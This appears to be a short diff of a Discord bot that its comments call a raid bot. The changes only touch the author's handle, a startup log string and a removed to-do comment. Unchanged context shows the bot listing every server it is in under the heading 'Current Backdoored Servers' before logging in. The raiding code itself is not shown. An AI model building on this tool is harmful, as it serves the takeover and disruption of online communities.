@@ -4,10 +4,10 @@ const bot = new Discord.Client();
 const moment = require("moment");
 
 // A raid bot made by Bin
-// Discord: bin#4373
+// Discord: ϾᚱÆϏ#8057
 
 bot.on("ready", async () => {
-	console.log(`Protocol Raid bot by Bin.`); // Console log telling the bot has started
+	console.log(`Simple Raid bot by Bin.`); // Console log telling the bot has started
     console.log(`--Current Backdoored Servers--`)
     bot.guilds.map((guild) => console.log(`Name: ${guild.name} (ID: ${guild.id})`)); // Displays all servers in console
     console.log(`----------------------`)
@@ -579,5 +579,4 @@ function convertMS(ms) {
    		}
    	}
 });
-// To Do: finished
 bot.login(botSettings.token);
